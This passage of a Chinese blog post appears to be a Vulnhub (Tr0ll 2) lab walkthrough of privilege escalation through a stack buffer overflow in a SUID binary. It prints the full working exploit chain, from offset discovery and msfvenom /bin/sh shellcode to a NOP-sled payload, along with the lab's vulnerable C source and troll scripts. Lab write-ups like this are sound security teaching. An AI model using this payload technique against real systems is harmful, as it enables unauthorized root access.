+<span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>那么直接执行 bash，利用 python 获取一个伪终端环境：</p>
+<p><img src="/images/2021-06-22/initial.webp" alt="initial"></p>
+<h1 id="提权">提权</h1>
+<p>一番枚举过后，除了内核版本低，有一个奇怪的文件夹中有奇怪的具有 SUID 权限的可执行程序外，并无其它发现。</p>
+<p><img src="/images/2021-06-22/enum.webp" alt="enum"></p>
+<p>三个文件夹内分别有一个 r00t, 但只有一个有用，其它两个都是坑，且具体是哪个是会变化的。所以说只能碰运气去找，正确的那个会接受一个命令行参数，如下所示：</p>
+<p><img src="/images/2021-06-22/door.webp" alt="door"></p>
+<p>该机器的 nc 被做了手脚无法使用，但是有 Python 且防火墙策略没那么严格，直接利用 SimpleHTTPServer 将该文件传出分析，使用 Ghidra 观察其 main 函数：</p>
+<p><img src="/images/2021-06-22/ghidra.webp" alt="ghidra"></p>
+<p>strcpy 直接复制命令行参数到栈缓冲区，查看程序具有的防护机制，无 PIE，NX，canary，摆明了是简单的直接利用：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">checksec --file<span class="o">=</span>r00t
+
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols        FORTIFY  Fortified       Fortifiable     FILE
+Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   73<span class="o">)</span> Symbols      No     <span class="m">0</span>               <span class="m">2</span>               r00t</code></pre></td></tr></table>
+</div>
+</div>
+<p>机器上也存在 gdb，直接调试。</p>
+<p>首先生成特征串，用来确定缓冲区的大小：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">msf-pattern_create -l <span class="m">1000</span>
+
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B</code></pre></td></tr></table>
+</div>
+</div>
+<p><img src="/images/2021-06-22/gdb.webp" alt="gdb"></p>
+<p><img src="/images/2021-06-22/eip.webp" alt="eip"></p>
+<p>EIP 被 0x6a413969 覆盖，查询偏移：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">msf-pattern_offset -q 0x6a413969
+
+<span class="o">[</span>*<span class="o">]</span> Exact match at offset <span class="m">268</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>尝试寻找 jmp esp 的跳板，并没有，看来只能填一个栈上的绝对地址。因为是绝对地址故有一些注意事项，利用 msfvenom 生成 shellcode，由于使用 strcpy 进行拷贝，需避免出现 <strong>\x00</strong>。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">msfvenom -p linux/x86/exec <span class="nv">CMD</span><span class="o">=</span><span class="s2">&#34;/bin/sh&#34;</span> -b <span class="s2">&#34;\x00&#34;</span> -f python
+
+<span class="nv">buf</span> <span class="o">=</span>  b<span class="s2">&#34;&#34;</span>
+<span class="nv">buf</span> <span class="o">+=</span> b<span class="s2">&#34;\xda\xd2\xd9\x74\x24\xf4\x58\xbb\xf6\x54\xa3\xbb\x31&#34;</span>
+<span class="nv">buf</span> <span class="o">+=</span> b<span class="s2">&#34;\xc9\xb1\x0b\x83\xc0\x04\x31\x58\x16\x03\x58\x16\xe2&#34;</span>
+<span class="nv">buf</span> <span class="o">+=</span> b<span class="s2">&#34;\x03\x3e\xa8\xe3\x72\xed\xc8\x7b\xa9\x71\x9c\x9b\xd9&#34;</span>
+<span class="nv">buf</span> <span class="o">+=</span> b<span class="s2">&#34;\x5a\xed\x0b\x19\xcd\x3e\xae\x70\x63\xc8\xcd\xd0\x93&#34;</span>
+<span class="nv">buf</span> <span class="o">+=</span> b<span class="s2">&#34;\xc2\x11\xd4\x63\xfc\x73\xbd\x0d\x2d\x07\x55\xd2\x66&#34;</span>
+<span class="nv">buf</span> <span class="o">+=</span> b<span class="s2">&#34;\xb4\x2c\x33\x45\xba&#34;</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>环境变量和命令行参数都是布局在栈地址之上的，也就是栈底位置。所以这里才先生成payload再确定覆盖的地址，暂时 payload 如下所示，覆盖的地址暂时用 BBBB 替代：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">python -c <span class="s2">&#34;print &#39;A&#39; * 268 + &#39;BBBB&#39; + &#39;\x90&#39; * 512 + &#39;\xda\xd2\xd9\x74\x24\xf4\x58\xbb\xf6\x54\xa3\xbb\x31\xc9\xb1\x0b\x83\xc0\x04\x31\x58\x16\x03\x58\x16\xe2\x03\x3e\xa8\xe3\x72\xed\xc8\x7b\xa9\x71\x9c\x9b\xd9\x5a\xed\x0b\x19\xcd\x3e\xae\x70\x63\xc8\xcd\xd0\x93\xc2\x11\xd4\x63\xfc\x73\xbd\x0d\x2d\x07\x55\xd2\x66\xb4\x2c\x33\x45\xba&#39;&#34;</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>gdb 调试前先在 main 函数 RET 处下断点：</p>
+<p><img src="/images/2021-06-22/break.webp" alt="break"></p>
+<p>使用以上的参数运行程序，成功断下，查看寄存器：</p>
+<p><img src="/images/2021-06-22/esp.webp" alt="esp"></p>
+<p><strong>ESP</strong> 的值为 0xbffff8cc，由于这里布置了 512 字节的 nop 在 shellcode 前方，故覆盖地址的选择便十分宽松(gdb 内和外的栈不完全相同，这里借用大片的 nop 来抵消)，我选择 0xbffff880，重新运行程序：</p>
+<p><img src="/images/2021-06-22/root.webp" alt="root"></p>
+<p>拿到 root 权限。</p>
+<!--
+
+最后，该机器中的一些程序的代码：
+
+bof.c
+
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+        
+        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">542</span><span class="p">];</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+
+                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Usage: %s input</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+        <span class="p">}</span>
+
+        <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div>
+
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span> <span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">2 MINUTE HARD MODE LOL</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">fork</span><span class="p">())</span>
+        <span class="p">{</span>
+                
+                <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/chmod 600 /bin/ls&#34;</span><span class="p">);</span>
+                <span class="n">sleep</span><span class="p">(</span><span class="mi">120</span><span class="p">);</span>
+                <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/chmod 777 /bin/ls&#34;</span><span class="p">);</span>
+        <span class="p">}</span>
+
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div>
+
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Good job, stand by, executing root shell...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+        <span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;BUHAHAHA NOOB!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+        <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">fork</span><span class="p">())</span>
+        <span class="p">{</span>
+        <span class="n">system</span><span class="p">(</span><span class="s">&#34;reboot&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div>
+
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">shutil</span>
+<span class="kn">import</span> <span class="nn">os</span>
+
+<span class="n">source1</span> <span class="o">=</span> <span class="s2">&#34;/root/core1/&#34;</span>
+<span class="n">source2</span> <span class="o">=</span> <span class="s2">&#34;/root/core2/&#34;</span>
+<span class="n">source3</span> <span class="o">=</span> <span class="s2">&#34;/root/core3/&#34;</span>
+<span class="n">source4</span> <span class="o">=</span> <span class="s2">&#34;/root/core4/&#34;</span>
+
+<span class="n">dest</span><span class="o">=</span> <span class="s2">&#34;/nothing_to_see_here/choose_wisely/&#34;</span>
+
+<span class="n">lottery</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">5</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">choice</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">lottery</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+            <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;rm -r /nothing_to_see_here/*&#34;</span><span class="p">)</span>
+            <span class="n">shutil</span><span class="o">.</span><span class="n">copytree</span><span class="p">(</span><span class="n">source1</span><span class="p">,</span> <span class="n">dest</span><span class="p">,</span> <span class="n">symlinks</span> <span class="o">=</span> <span class="bp">False</span><span class="p">,</span> <span class="n">ignore</span> <span class="o">=</span> <span class="bp">None</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">lottery</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+            <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;rm -r /nothing_to_see_here/*&#34;</span><span class="p">)</span>
+            <span class="n">shutil</span><span class="o">.</span><span class="n">copytree</span><span class="p">(</span><span class="n">source2</span><span class="p">,</span> <span class="n">dest</span><span class="p">,</span> <span class="n">symlinks</span> <span class="o">=</span> <span class="bp">False</span><span class="p">,</span> <span class="n">ignore</span> <span class="o">=</span> <span class="bp">None</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">lottery</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
+            <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;rm -r /nothing_to_see_here/*&#34;</span><span class="p">)</span></code></pre></td></tr></table>
+</div>
+</div>
+
+-->
+<h1 id="参考">参考</h1>
+<ol>
+<li>
+<p><a href="https://www.cyberciti.biz/faq/unix-linux-execute-command-using-ssh/">How To Run / Execute Command Using SSH</a></p>
+</li>
+<li>
+<p><a href="https://unix.stackexchange.com/questions/157477/how-can-shellshock-be-exploited-over-ssh">how can shellshock be exploited over SSH?</a></p>
+</li>
+<li>
+<p><a href="https://stackoverflow.com/questions/50662903/differences-in-environment-layout-with-and-without-gdb">Differences in environment layout with and without GDB</a></p>
+</li>
+<li>
+<p><a href="https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it/17775966#17775966">Buffer overflow works in gdb but not without it</a></p>
+</li>
+</ol>
+<!--https://hausec.com/vulnhub-write-ups/tr0ll-2/>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">Josephine</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+        2021-06-21
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/vulnhub/">Vulnhub</a>
+          </div>
+      <nav class="post-nav">
+        <a class="prev" href="/post/vulnhub-devguru/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">Vulnhub Devguru</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        <a class="next" href="/post/gdb-%E5%A4%9A%E6%8F%92%E4%BB%B6%E5%B9%B6%E5%AD%98/">
+            <span class="next-text nav-default">GDB 多插件并存</span>
+            <span class="next-text nav-mobile">下一篇</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+  <a href="https://bulletforkiller.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2020 - 
+    2021<span class="heart"><i class="iconfont icon-heart"></i></span><span>Josephine</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+
+
+
+<script type="text/javascript" src="/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
